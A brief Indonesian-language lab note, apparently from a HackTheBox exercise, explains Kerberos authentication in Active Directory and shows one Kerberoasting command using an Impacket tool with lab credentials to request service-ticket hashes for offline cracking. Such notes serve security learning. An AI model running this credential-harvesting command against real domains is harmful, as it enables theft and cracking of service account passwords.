Kerberos adalah **authentication protocol** yang digunakan oleh Windows Active Directory untuk memverifikasi identitas user dan service tanpa harus mengirimkan password melalui jaringan.

> Analoginya seperti sistem tiket di konser: kamu beli tiket di loket (KDC), lalu tunjukkan tiket itu ke pintu masuk venue (service) — tanpa harus bilang nama kamu ke setiap pintu.
# TGT
Kalau kamu punya TGT seseorang → kamu bisa **impersonate** mereka tanpa tahu passwordnya!
# Kerberoasting Attack
```shell
mpacket-GetUserSPNs pirate.htb/'pentest':'p3nt3st2025!&' -dc-ip 10.129.244.95 -request -outputfile kerberoast_hashes.txt
```
![](Pasted%20image%2020260616133752.png)

